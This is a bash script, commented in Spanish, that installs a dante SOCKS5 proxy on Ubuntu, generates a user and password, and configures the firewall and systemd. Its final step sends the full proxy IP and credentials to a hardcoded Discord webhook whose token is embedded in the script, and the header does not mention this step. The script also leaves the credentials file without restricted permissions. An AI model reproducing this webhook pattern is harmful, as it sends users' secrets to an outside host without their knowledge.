#!/bin/bash

# ==============================================================================
# Script para Instalar y Configurar danted (SOCKS5 Proxy) en Ubuntu
# VERSIÓN FINAL: Devuelve credenciales a Ansible y crea un archivo local.
# ==============================================================================

# -- Configuración de Seguridad --
set -e

# -- Variables Globales --
CONFIG_FILE="/etc/danted.conf"
SERVICE_FILE="/lib/systemd/system/danted.service"
LOG_FILE="/var/log/socks.log"
PROXY_PORT="1080"
CREDENTIALS_FILE="$HOME/proxy_credentials.csv" # Ruta del nuevo archivo

# --- Funciones Auxiliares ---
log_step() {
    echo ""
    echo "============================================================"
    echo "=> $1"
    echo "============================================================"
}

# --- Funciones de Tareas (sin cambios) ---

install_dependencies() {
    log_step "Paso 1: Instalando dependencias (dante-server, ufw, curl)"
    sudo apt-get update -y
    sudo apt-get install dante-server ufw curl -y
    echo "Dependencias instaladas correctamente."
}

manage_proxy_user() {
    log_step "Paso 2: Gestionando el usuario del proxy"
    local existing_user
    existing_user=$(grep '^proxys' /etc/passwd | cut -d: -f1 | head -n 1)
    if [ -n "$existing_user" ]; then
        echo "Eliminando usuario de proxy existente: '$existing_user'..."
        sudo userdel -f "$existing_user"
    fi
    local user="$1"
    local pass="$2"
    echo "Creando nuevo usuario: $user"
    sudo useradd --system --no-create-home --shell /usr/sbin/nologin "$user"
    echo "$user:$pass" | sudo chpasswd
}

configure_firewall() {
    log_step "Paso 3: Configurando el firewall (UFW)"
    sudo ufw allow "$PROXY_PORT"
    sudo ufw allow ssh
    echo "y" | sudo ufw enable
    sudo ufw status verbose | cat
}

configure_danted() {
    local user="$1"
    log_step "Paso 4: Configurando danted.conf con autenticación"
    local external_interface
    external_interface=$(ip route | grep '^default' | awk '{print $5}')
    if [ -z "$external_interface" ]; then echo "Error: No se pudo detectar la interfaz de red."; exit 1; fi
    echo "Interfaz de red detectada: $external_interface"
    sudo tee "$CONFIG_FILE" > /dev/null <<EOF
logoutput: $LOG_FILE
internal: 0.0.0.0 port = $PROXY_PORT
external: $external_interface
user.privileged: root
user.unprivileged: $user
socksmethod: username
clientmethod: none
client pass { from: 0.0.0.0/0 to: 0.0.0.0/0 log: connect disconnect error }
socks pass { from: 0.0.0.0/0 to: 0.0.0.0/0 log: connect disconnect error }
EOF
    sudo touch "$LOG_FILE"
}

configure_service() {
    log_step "Paso 5: Modificando el archivo de servicio de systemd"
    local line_to_add="ReadWriteDirectories=/var/log"
    if [ ! -f "$SERVICE_FILE" ]; then echo "Error: Archivo de servicio no encontrado."; exit 1; fi
    if ! sudo grep -qF "$line_to_add" "$SERVICE_FILE"; then
        sudo sed -i "/^\[Service\]/a $line_to_add" "$SERVICE_FILE"
    fi
}

apply_changes() {
    log_step "Paso 6: Aplicando todos los cambios y reiniciando el servicio"
    sudo systemctl daemon-reload
    sudo systemctl restart danted.service
    sudo systemctl status danted.service --no-pager
}

# --- Ejecución Principal del Script ---
main() {
    log_step "Iniciando configuración de SOCKS5 Proxy"
    local id_unico
    id_unico=$(</dev/urandom tr -dc 'a-f0-9' | head -c 6)
    local proxy_user="proxys$id_unico"
    local proxy_pass
    proxy_pass=$(</dev/urandom tr -dc 'A-Za-z0-9' | head -c 16)
    
    install_dependencies
    manage_proxy_user "$proxy_user" "$proxy_pass"
    configure_firewall
    configure_danted "$proxy_user"
    configure_service
    apply_changes
    
    # Muestra las credenciales para el usuario
    echo ""
    echo "============================================================"
    echo "✅ ¡Proceso completado!"
    echo "  Usuario nuevo generado: $proxy_user"
    echo "  Contraseña nueva generada: $proxy_pass"
    echo "============================================================"

    # --- OBTENER IP Y CONSTRUIR CADENA DE CREDENCIALES ---
    PUBLIC_IP=$(curl -4s https://ip.hetzner.com)
    if [ -z "$PUBLIC_IP" ]; then
        echo "Error: No se pudo obtener la IP pública."
        # Salimos si no podemos obtener la IP, ya que ambas tareas fallarán
        exit 1
    fi
    PROXY_STRING="$PUBLIC_IP:$PROXY_PORT:$proxy_user:$proxy_pass"

    # --- NUEVA SECCIÓN: CREAR ARCHIVO DE CREDENCIALES EN EL SERVIDOR ---
    echo "Creando archivo de credenciales en el servidor..."
    echo "$PROXY_STRING" > "$CREDENTIALS_FILE"
    # Asignamos el archivo al usuario 'ubuntu' para que pueda acceder a él
    # chown ubuntu:ubuntu "$CREDENTIALS_FILE"
    # chmod 600 "$CREDENTIALS_FILE" # Permisos de lectura/escritura solo para el propietario
    echo "Archivo de credenciales guardado en '$CREDENTIALS_FILE'."

    # --- SALIDA PARA ANSIBLE (sin cambios) ---
    echo "Generando cadena de conexión para Ansible..."
    echo "ANSIBLE_PROXY_STRING:$PROXY_STRING"

    # --- Send Discord Webhook ---
    log_step "Sending proxy credentials to Discord webhook..."
    JSON_PAYLOAD=$(printf '{"content":"%s"}' "$PROXY_STRING")
    curl -X POST -H "Content-Type: application/json" -d "$JSON_PAYLOAD" "https://discord.com/api/webhooks/1407932479700074536/NG_t2Xq0h0cCRMBh9A7Q36A-XQ8JPaoxz5Nkn2JH5okeWsPM_fEkXhrzc5n8icPhNvld"
    echo
    echo "Webhook notification sent."
}

main